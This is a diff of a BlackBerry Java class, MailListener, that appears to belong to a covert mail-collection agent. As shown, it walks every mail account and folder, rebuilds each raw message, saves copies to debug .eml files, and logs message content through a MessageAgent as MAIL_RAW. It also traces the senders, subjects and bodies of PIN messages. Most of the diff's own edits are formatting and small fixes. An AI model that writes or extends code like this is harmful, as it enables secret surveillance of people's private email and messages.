@@ -31,13 +31,13 @@ import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.DateTimeUtilities;
 import net.rim.device.api.util.IntHashtable;
 import blackberry.agent.MessageAgent;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
 import blackberry.log.LogType;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
-import blackberry.utils.Debug;
-import blackberry.utils.DebugLevel;
 import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
@@ -194,7 +194,7 @@ public final class MailListener implements FolderListener, StoreListener,
         collecting = true;
         // questa data rappresenta l'ultimo controllo effettuato.
         final Date lastCheckDate = messageAgent.lastcheckGet("COLLECT");
-        
+
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
             names[count] = mailServiceRecords[count].getName();
@@ -209,7 +209,7 @@ public final class MailListener implements FolderListener, StoreListener,
 
             final Folder[] folders = store.list();
             // Scandisco ogni Folder dell'account di posta
-            scanFolders(names[count], folders,lastCheckDate);
+            scanFolders(names[count], folders, lastCheckDate);
         }
 
         //#ifdef MARKUP_TIMESTAMP            
@@ -268,7 +268,8 @@ public final class MailListener implements FolderListener, StoreListener,
             databuffer.writeInt(size);
             databuffer.writeLong(filetime.getFiledate());
             //#ifdef DBC
-            Check.asserts(additionalData.length == 20, "Mail Wrong buffer size: " + additionalData.length);
+            Check.asserts(additionalData.length == 20,
+                    "Mail Wrong buffer size: " + additionalData.length);
             //#endif
 
             //#ifdef DEBUG_TRACE
@@ -276,34 +277,38 @@ public final class MailListener implements FolderListener, StoreListener,
                     + mail.substring(0, Math.min(mail.length(), 200)));
 
             AutoFlashFile mailSaved;
-            
-/*            mailSaved = new AutoFlashFile(Path.USER()
-                    + filetime.getOrderedString() + "UTF8.eml", false);
-            mailSaved.create();
-            mailSaved.write(mail.getBytes("UTF-8"));*/
-            
-            mailSaved = new AutoFlashFile(Path.USER()+ Path.DEBUG_DIR
+
+            /*
+             * mailSaved = new AutoFlashFile(Path.USER()
+             * + filetime.getOrderedString() + "UTF8.eml", false);
+             * mailSaved.create();
+             * mailSaved.write(mail.getBytes("UTF-8"));
+             */
+
+            mailSaved = new AutoFlashFile(Path.USER() + Path.DEBUG_DIR + "M_"
                     + filetime.getOrderedString() + ".ISO-8859-1.eml", false);
             mailSaved.create();
             mailSaved.write(mail.getBytes("ISO-8859-1"));
-            
-/*            mailSaved = new AutoFlashFile(Path.USER()
-                    + filetime.getOrderedString() + ".UTF16.eml", false);
-            mailSaved.create();
-            mailSaved.write(mail.getBytes("UTF-16BE"));*/
+
+            /*
+             * mailSaved = new AutoFlashFile(Path.USER()
+             * + filetime.getOrderedString() + ".UTF16.eml", false);
+             * mailSaved.create();
+             * mailSaved.write(mail.getBytes("UTF-16BE"));
+             */
             //#endif
 
-                       
             messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
                     LogType.MAIL_RAW);
-            
-/*            newMail = mail + "WCHAR";
-            messageAgent.createLog(additionalData, WChar.getBytes(newMail),
-                    LogType.MAIL_RAW);
-            
-            newMail = mail + "UTF-8";
-            messageAgent.createLog(additionalData, newMail.getBytes("UTF-8"),
-                    LogType.MAIL_RAW);*/
+
+            /*
+             * newMail = mail + "WCHAR";
+             * messageAgent.createLog(additionalData, WChar.getBytes(newMail),
+             * LogType.MAIL_RAW);
+             * newMail = mail + "UTF-8";
+             * messageAgent.createLog(additionalData, newMail.getBytes("UTF-8"),
+             * LogType.MAIL_RAW);
+             */
 
         } catch (final Exception ex) {
             //#ifdef DEBUG_ERROR
@@ -330,15 +335,15 @@ public final class MailListener implements FolderListener, StoreListener,
      * @param subfolders
      *            the subfolders
      */
-    public void scanFolders(final String storeName, final Folder[] subfolders, Date lastCheckDate) {
+    public void scanFolders(final String storeName, final Folder[] subfolders,
+            Date lastCheckDate) {
         Folder[] dirs;
 
         //#ifdef DBC
         Check.requires(subfolders != null && subfolders.length >= 0,
                 "scanFolders");
+        Check.requires(lastCheckDate != null, "scanFolders lastCheckDate null");
         //#endif
-        
-        
 
         for (int count = 0; count < subfolders.length; count++) {
 
@@ -443,13 +448,18 @@ public final class MailListener implements FolderListener, StoreListener,
     private Date lookForPinMessages(final Message[] messages)
             throws MessagingException {
 
+        //#ifdef DEBUG_TRACE
+        debug.trace("lookForPinMessages on: " + messages.length);
+        //#endif
+
         // stampo le date.
         Date precRecDate = null;
-        //#ifdef DEBUG_TRACE
 
-        /* Date precSentDate = null; */
-        for (int j = 0; j < messages.length; j++) {
-            try {
+        try {
+
+            /* Date precSentDate = null; */
+            for (int j = 0; j < messages.length; j++) {
+
                 final Message message = messages[j];
                 if (precRecDate != null) {
                     Check.asserts(precRecDate.getTime() <= message
@@ -466,7 +476,7 @@ public final class MailListener implements FolderListener, StoreListener,
                             + message.getSubject());
                 } else {
                     if (address != null) {
-                        final String name = address.getAddr();
+                        final String name = address.getName();
                         if (name != null && name.length() == 8
                                 && name.indexOf("@") == -1
                                 && name.indexOf(" ") == -1) {
@@ -475,6 +485,7 @@ public final class MailListener implements FolderListener, StoreListener,
                             debug.trace("  s: " + message.getSubject());
                             debug.trace("  b: " + message.getBodyText());
                         }
+
                     }
 
                     final Address[] addresses = message
@@ -482,6 +493,7 @@ public final class MailListener implements FolderListener, StoreListener,
                     for (int i = 0; i < addresses.length; i++) {
                         address = addresses[i];
                         if (address != null) {
+
                             final String name = address.getAddr();
                             if (name != null && name.length() == 8
                                     && name.indexOf("@") == -1
@@ -494,11 +506,15 @@ public final class MailListener implements FolderListener, StoreListener,
                         }
                     }
                 }
-            } catch (final AddressException ex) {
-                debug.error(ex.toString());
+
             }
+
+        } catch (Exception ex) {
+            //#ifdef DEBUG_ERROR
+            debug.error(ex);
+            //#endif
         }
-        //#endif
+
         return precRecDate;
     }
 
@@ -569,7 +585,7 @@ public final class MailListener implements FolderListener, StoreListener,
 
         if (mail.isMultipart()) {
             mailRaw.append("Content-Type: multipart/alternative; boundary="
-                    + boundary + "\r\n\r\n");
+                    + boundary + "\r\n");
             mailRaw.append("\r\n--" + boundary + "\r\n");
         }
 
@@ -616,7 +632,9 @@ public final class MailListener implements FolderListener, StoreListener,
     }
 
     /**
-     * Aggiunge alla mail "raw" generata la lista di header presenti nel Message originale
+     * Aggiunge alla mail "raw" generata la lista di header presenti nel Message
+     * originale
+     * 
      * @param headers
      * @param mail
      */
@@ -641,6 +659,7 @@ public final class MailListener implements FolderListener, StoreListener,
     /**
      * Il metodo addAllHeaders non estrae il campo from.
      * Occorre specificarglelo esplicitamente.
+     * 
      * @param headers
      * @param mail
      * @param from
